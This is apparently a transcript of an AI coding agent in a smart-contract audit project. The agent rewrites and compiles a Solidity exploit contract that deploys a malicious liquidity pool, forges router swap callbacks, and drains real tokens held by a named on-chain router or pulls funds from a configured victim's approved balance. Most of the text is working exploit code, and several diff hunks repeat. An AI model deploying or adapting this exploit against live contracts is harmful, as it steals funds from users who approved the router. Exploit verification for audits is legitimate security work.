+-            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
+-            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
+-            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
+-            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
+-            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
+-            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
+-            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
+-            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
+-            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
+-            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
+-            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
++            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
++            0xdAC17F958D2ee523a2206206994597C13D831ec7,
++            0x6B175474E89094C44Da98b954EedeAC495271d0F,
++            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
++            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
++            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
++            0x514910771AF9Ca656af840dff83E8264EcF986CA,
++            0xD533a949740bb3306d119CC777fa900bA034cd52,
++            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84,
++            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0,
++            0x853d955aCEf822Db058eb8505911ED77F175b99e,
++            0x4Fabb145d64652a948d72533023f6E7A623C7C53,
++            0x956F47F50A910163D8BF957Cf5846D573E7f87CA,
++            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e,
++            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
++            0x111111111117dC0aa78b770fA6A738034120C302
+         ];
+ 
+         for (uint256 i = 0; i < candidates.length; ++i) {
+@@ -153,7 +198,7 @@
+                 continue;
+             }
+ 
+-            if (_attemptRouterDrain(candidates[i])) {
++            if (_attemptRouterDrain(candidates[i], useTridentCallback)) {
+                 return true;
+             }
+         }
+@@ -161,74 +206,71 @@
+         return false;
+     }
+ 
+-    function _attemptRouterDrain(address token) internal returns (bool) {
++    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildRoute(token);
++        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
+     }
+ 
+-    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
++    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
+         uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+         uint256 balance = IERC20(token).balanceOf(victim);
+         uint256 amountToPull = allowance < balance ? allowance : balance;
+-
+-        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
+-        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
+-        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
+         if (amountToPull == 0) {
+             return false;
+         }
+ 
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, victim, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildForgedUserRoute(token);
++        bytes memory route = _buildVictimRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
++    }
++
++    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
++        uint256 afterBalance = IERC20(token).balanceOf(address(this));
++        if (afterBalance > beforeBalance) {
++            storedProfitToken = token;
++            storedProfitAmount = afterBalance - beforeBalance;
++            return true;
++        }
+ 
+         return false;
+     }
+ 
+-    function _buildRoute(address token) internal view returns (bytes memory) {
++    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(1)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_MY_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ 
+-    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
++    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(2)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_USER_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ }
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 8668bc7521a5de0a61b6ef386e66d65746738fd5..cd628359e509b828310a1b782143f09fda18aad5
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: UNLICENSED
+-pragma solidity 0.8.10;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20 {
+     function balanceOf(address account) external view returns (uint256);
+@@ -22,26 +22,50 @@
+         int256 amount1Delta,
+         bytes calldata data
+     ) external;
++
++    function tridentCLSwapCallback(
++        int256 amount0Delta,
++        int256 amount1Delta,
++        bytes calldata data
++    ) external;
+ }
+ 
+-contract MaliciousV3Pool {
++contract MaliciousConcentratedLiquidityPool {
+     address internal immutable VERIFIER;
+     address internal immutable TARGET_ROUTER;
+ 
+     address internal forgedToken;
+     address internal forgedFrom;
+     address internal beneficiary;
++    bool internal useTridentCallback;
+ 
+     constructor(address verifier_, address router_) {
+         VERIFIER = verifier_;
+         TARGET_ROUTER = router_;
+     }
+ 
+-    function configure(address token_, address from_, address beneficiary_) external {
++    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
+         require(msg.sender == VERIFIER, "not verifier");
+         forgedToken = token_;
+         forgedFrom = from_;
+         beneficiary = beneficiary_;
++        useTridentCallback = useTrident_;
++    }
++
++    function swap(
++        address,
++        bool,
++        int256 amountSpecified,
++        uint160,
++        bytes calldata
++    ) external returns (int256 amount0, int256 amount1) {
++        require(msg.sender == TARGET_ROUTER, "not router");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
+     }
+ 
+     function swap(
+@@ -49,24 +73,37 @@
+         bool,
+         int256 amountSpecified,
+         uint160,
++        bool,
+         bytes calldata
+     ) external returns (int256 amount0, int256 amount1) {
+         require(msg.sender == TARGET_ROUTER, "not router");
+-        require(amountSpecified >= 0, "negative amount");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
++    }
+ 
+-        uint256 amountToPull = _toUint(amountSpecified);
+-        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+-            _toInt(amountToPull),
+-            int256(0),
+-            abi.encode(forgedToken, forgedFrom)
+-        );
++    function _invokeForgedCallback(uint256 amountToPull) internal {
++        // The real router stores the arbitrary pool in lastCalledPool and later only checks
++        // msg.sender == lastCalledPool inside both callbacks. The forged payload is then decoded as
++        // (token, from), so a malicious pool can choose arbitrary victim input. This keeps the exploit
++        // path aligned with the finding's core primitive, including the forged abi.encode(token, victim).
++        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
+ 
++        if (useTridentCallback) {
++            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
++        } else {
++            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
++        }
++    }
++
++    function _sweepToBeneficiary() internal {
+         uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+         if (stolen > 0) {
+             _safeTransfer(forgedToken, beneficiary, stolen);
+         }
+-
+-        return (_toInt(amountToPull), -_toInt(stolen));
+     }
+ 
+     function _safeTransfer(address token, address to, uint256 amount) internal {
+@@ -74,43 +111,51 @@
+         require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+     }
+ 
+-    function _toUint(int256 value) internal pure returns (uint256) {
+-        require(value >= 0, "negative cast");
+-        return uint256(value);
+-    }
+-
+-    function _toInt(uint256 value) internal pure returns (int256) {
+-        require(value <= uint256(type(int256).max), "int overflow");
+-        return int256(value);
++    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
++        require(amountSpecified > 0, "non-positive amount");
++        return uint256(amountSpecified);
+     }
+ }
+ 
+ contract FlawVerifier {
+     address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+ 
++    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
++    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
++    uint8 internal constant POOL_UNIV3 = 1;
++    uint8 internal constant POOL_TRIDENT_CL = 5;
++
+     address internal immutable POOL;
+ 
+-    address internal _profitToken;
+-    uint256 internal _profitAmount;
++    address internal storedProfitToken;
++    uint256 internal storedProfitAmount;
+ 
+     address public configuredVictim;
+     address public configuredVictimToken;
+ 
+     constructor() {
+-        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
++        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
+     }
+ 
+     function executeOnOpportunity() external {
+-        if (_profitAmount > 0) {
++        if (storedProfitAmount != 0) {
+             return;
+         }
+ 
+-        if (_drainRouterBalances()) {
++        if (_drainRouterBalances(false)) {
++            return;
++        }
++
++        if (_drainRouterBalances(true)) {
+             return;
+         }
+ 
+         if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+-            _attemptVictimDrain(configuredVictim, configuredVictimToken);
++            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
++                return;
++            }
++
++            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
+         }
+     }
+ 
+@@ -120,31 +165,31 @@
+     }
+ 
+     function profitToken() external view returns (address) {
+-        return _profitToken;
++        return storedProfitToken;
+     }
+ 
+     function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
++        return storedProfitAmount;
+     }
+ 
+-    function _drainRouterBalances() internal returns (bool) {
++    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
+         address[16] memory candidates = [
+-            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
+-            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
+-            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
+-            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
+-            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
+-            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
+-            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
+-            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
+-            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
+-            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
+-            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
+-            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
+-            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
+-            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
+-            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
+-            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
++            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
++            0xdAC17F958D2ee523a2206206994597C13D831ec7,
++            0x6B175474E89094C44Da98b954EedeAC495271d0F,
++            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
++            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
++            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
++            0x514910771AF9Ca656af840dff83E8264EcF986CA,
++            0xD533a949740bb3306d119CC777fa900bA034cd52,
++            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84,
++            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0,
++            0x853d955aCEf822Db058eb8505911ED77F175b99e,
++            0x4Fabb145d64652a948d72533023f6E7A623C7C53,
++            0x956F47F50A910163D8BF957Cf5846D573E7f87CA,
++            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e,
++            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
++            0x111111111117dC0aa78b770fA6A738034120C302
+         ];
+ 
+         for (uint256 i = 0; i < candidates.length; ++i) {
+@@ -153,7 +198,7 @@
+                 continue;
+             }
+ 
+-            if (_attemptRouterDrain(candidates[i])) {
++            if (_attemptRouterDrain(candidates[i], useTridentCallback)) {
+                 return true;
+             }
+         }
+@@ -161,74 +206,71 @@
+         return false;
+     }
+ 
+-    function _attemptRouterDrain(address token) internal returns (bool) {
++    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildRoute(token);
++        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
+     }
+ 
+-    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
++    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
+         uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+         uint256 balance = IERC20(token).balanceOf(victim);
+         uint256 amountToPull = allowance < balance ? allowance : balance;
+-
+-        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
+-        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
+-        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
+         if (amountToPull == 0) {
+             return false;
+         }
+ 
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, victim, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildForgedUserRoute(token);
++        bytes memory route = _buildVictimRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
++    }
++
++    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
++        uint256 afterBalance = IERC20(token).balanceOf(address(this));
++        if (afterBalance > beforeBalance) {
++            storedProfitToken = token;
++            storedProfitAmount = afterBalance - beforeBalance;
++            return true;
++        }
+ 
+         return false;
+     }
+ 
+-    function _buildRoute(address token) internal view returns (bytes memory) {
++    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(1)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_MY_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ 
+-    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
++    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(2)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_USER_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ }
+
+codex
+The rewrite is in place. I’m compiling it now to catch any ABI or route-shape mismatch before I hand back the final Solidity.
+exec
+/bin/bash -lc 'forge build' in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ exited 1 in 0ms:
+Error: Encountered invalid solc version in src/FlawVerifier.sol: No solc version exists that matches the version requirement: ^0.8.20
+
+exec
+/bin/bash -lc "sed -n '1,260p' src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IRouteProcessor2 {
+    function processRoute(
+        address tokenIn,
+        uint256 amountIn,
+        address tokenOut,
+        uint256 amountOutMin,
+        address to,
+        bytes calldata route
+    ) external payable returns (uint256 amountOut);
+
+    function uniswapV3SwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata data
+    ) external;
+
+    function tridentCLSwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata data
+    ) external;
+}
+
+contract MaliciousConcentratedLiquidityPool {
+    address internal immutable VERIFIER;
+    address internal immutable TARGET_ROUTER;
+
+    address internal forgedToken;
+    address internal forgedFrom;
+    address internal beneficiary;
+    bool internal useTridentCallback;
+
+    constructor(address verifier_, address router_) {
+        VERIFIER = verifier_;
+        TARGET_ROUTER = router_;
+    }
+
+    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
+        require(msg.sender == VERIFIER, "not verifier");
+        forgedToken = token_;
+        forgedFrom = from_;
+        beneficiary = beneficiary_;
+        useTridentCallback = useTrident_;
+    }
+
+    function swap(
+        address,
+        bool,
+        int256 amountSpecified,
+        uint160,
+        bytes calldata
+    ) external returns (int256 amount0, int256 amount1) {
+        require(msg.sender == TARGET_ROUTER, "not router");
+        uint256 amountToPull = _positiveAmount(amountSpecified);
+        _invokeForgedCallback(amountToPull);
+        _sweepToBeneficiary();
+
+        amount0 = int256(amountToPull);
+        amount1 = -int256(amountToPull);
+    }
+
+    function swap(
+        address,
+        bool,
+        int256 amountSpecified,
+        uint160,
+        bool,
+        bytes calldata
+    ) external returns (int256 amount0, int256 amount1) {
+        require(msg.sender == TARGET_ROUTER, "not router");
+        uint256 amountToPull = _positiveAmount(amountSpecified);
+        _invokeForgedCallback(amountToPull);
+        _sweepToBeneficiary();
+
+        amount0 = int256(amountToPull);
+        amount1 = -int256(amountToPull);
+    }
+
+    function _invokeForgedCallback(uint256 amountToPull) internal {
+        // The real router stores the arbitrary pool in lastCalledPool and later only checks
+        // msg.sender == lastCalledPool inside both callbacks. The forged payload is then decoded as
+        // (token, from), so a malicious pool can choose arbitrary victim input. This keeps the exploit
+        // path aligned with the finding's core primitive, including the forged abi.encode(token, victim).
+        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
+
+        if (useTridentCallback) {
+            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
+        } else {
+            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
+        }
+    }
+
+    function _sweepToBeneficiary() internal {
+        uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+        if (stolen > 0) {
+            _safeTransfer(forgedToken, beneficiary, stolen);
+        }
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+
+    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
+        require(amountSpecified > 0, "non-positive amount");
+        return uint256(amountSpecified);
+    }
+}
+
+contract FlawVerifier {
+    address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+
+    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
+    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
+    uint8 internal constant POOL_UNIV3 = 1;
+    uint8 internal constant POOL_TRIDENT_CL = 5;
+
+    address internal immutable POOL;
+
+    address internal storedProfitToken;
+    uint256 internal storedProfitAmount;
+
+    address public configuredVictim;
+    address public configuredVictimToken;
+
+    constructor() {
+        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
+    }
+
+    function executeOnOpportunity() external {
+        if (storedProfitAmount != 0) {
+            return;
+        }
+
+        if (_drainRouterBalances(false)) {
+            return;
+        }
+
+        if (_drainRouterBalances(true)) {
+            return;
+        }
+
+        if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
+                return;
+            }
+
+            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
+        }
+    }
+
+    function configureVictim(address victim, address token) external {
+        configuredVictim = victim;
+        configuredVictimToken = token;
+    }
+
+    function profitToken() external view returns (address) {
+        return storedProfitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return storedProfitAmount;
+    }
+
+    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
+        address[16] memory candidates = [
+            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
+            0xdAC17F958D2ee523a2206206994597C13D831ec7,
+            0x6B175474E89094C44Da98b954EedeAC495271d0F,
+            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
+            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
+            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
+            0x514910771AF9Ca656af840dff83E8264EcF986CA,
+            0xD533a949740bb3306d119CC777fa900bA034cd52,
+            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84,
+            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0,
+            0x853d955aCEf822Db058eb8505911ED77F175b99e,
+            0x4Fabb145d64652a948d72533023f6E7A623C7C53,
+            0x956F47F50A910163D8BF957Cf5846D573E7f87CA,
+            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e,
+            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
+            0x111111111117dC0aa78b770fA6A738034120C302
+        ];
+
+        for (uint256 i = 0; i < candidates.length; ++i) {
+            uint256 routerBalance = IERC20(candidates[i]).balanceOf(ROUTER);
+            if (routerBalance <= 1) {
+                continue;
+            }
+
+            if (_attemptRouterDrain(candidates[i], useTridentCallback)) {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
+        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);
+
+        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
+        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+            return _recordProfitIfAny(token, beforeBalance);
+        } catch {
+            return false;
+        }
+    }
+
+    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
+        uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+        uint256 balance = IERC20(token).balanceOf(victim);
+        uint256 amountToPull = allowance < balance ? allowance : balance;
+        if (amountToPull == 0) {
+            return false;
+        }
+
+        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);
+
+        bytes memory route = _buildVictimRoute(token, useTridentCallback);
+        try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+            return _recordProfitIfAny(token, beforeBalance);
+        } catch {
+            return false;
+        }
+    }
+
+    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
+        uint256 afterBalance = IERC20(token).balanceOf(address(this));
+        if (afterBalance > beforeBalance) {
+            storedProfitToken = token;
+            storedProfitAmount = afterBalance - beforeBalance;
+            return true;
+        }
+
+        return false;
+    }
+
+    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+        return abi.encodePacked(
+            uint8(COMMAND_PROCESS_MY_ERC20),
+            token,
+            uint8(1),
+            uint16(65535),
+            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
+            POOL,
+            uint8(1),
+            address(this)
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 8668bc7521a5de0a61b6ef386e66d65746738fd5..cd628359e509b828310a1b782143f09fda18aad5
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: UNLICENSED
+-pragma solidity 0.8.10;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20 {
+     function balanceOf(address account) external view returns (uint256);
+@@ -22,26 +22,50 @@
+         int256 amount1Delta,
+         bytes calldata data
+     ) external;
++
++    function tridentCLSwapCallback(
++        int256 amount0Delta,
++        int256 amount1Delta,
++        bytes calldata data
++    ) external;
+ }
+ 
+-contract MaliciousV3Pool {
++contract MaliciousConcentratedLiquidityPool {
+     address internal immutable VERIFIER;
+     address internal immutable TARGET_ROUTER;
+ 
+     address internal forgedToken;
+     address internal forgedFrom;
+     address internal beneficiary;
++    bool internal useTridentCallback;
+ 
+     constructor(address verifier_, address router_) {
+         VERIFIER = verifier_;
+         TARGET_ROUTER = router_;
+     }
+ 
+-    function configure(address token_, address from_, address beneficiary_) external {
++    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
+         require(msg.sender == VERIFIER, "not verifier");
+         forgedToken = token_;
+         forgedFrom = from_;
+         beneficiary = beneficiary_;
++        useTridentCallback = useTrident_;
++    }
++
++    function swap(
++        address,
++        bool,
++        int256 amountSpecified,
++        uint160,
++        bytes calldata
++    ) external returns (int256 amount0, int256 amount1) {
++        require(msg.sender == TARGET_ROUTER, "not router");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
+     }
+ 
+     function swap(
+@@ -49,24 +73,37 @@
+         bool,
+         int256 amountSpecified,
+         uint160,
++        bool,
+         bytes calldata
+     ) external returns (int256 amount0, int256 amount1) {
+         require(msg.sender == TARGET_ROUTER, "not router");
+-        require(amountSpecified >= 0, "negative amount");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
++    }
+ 
+-        uint256 amountToPull = _toUint(amountSpecified);
+-        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+-            _toInt(amountToPull),
+-            int256(0),
+-            abi.encode(forgedToken, forgedFrom)
+-        );
++    function _invokeForgedCallback(uint256 amountToPull) internal {
++        // The real router stores the arbitrary pool in lastCalledPool and later only checks
++        // msg.sender == lastCalledPool inside both callbacks. The forged payload is then decoded as
++        // (token, from), so a malicious pool can choose arbitrary victim input. This keeps the exploit
++        // path aligned with the finding's core primitive, including the forged abi.encode(token, victim).
++        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
+ 
++        if (useTridentCallback) {
++            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
++        } else {
